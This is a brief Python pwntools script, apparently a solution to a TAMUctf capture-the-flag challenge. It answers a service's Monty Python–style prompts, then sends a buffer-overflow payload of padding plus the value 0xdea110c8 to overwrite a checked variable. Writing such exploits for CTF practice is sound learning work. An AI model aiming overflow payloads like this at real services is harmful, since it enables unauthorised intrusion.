from pwn import *

m = remote('pwn.tamuctf.com', 4321)

m.recvuntil('What... is your name?')
m.sendline('Sir Lancelot of Camelot')

print m.recvuntil('What... is your quest?')
m.sendline('To seek the Holy Grail.')

print m.recvuntil('What... is my secret?')
payload = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKK' + '\xc8\x10\xa1\xde'
m.sendline(payload)
log.info(m.recvall())
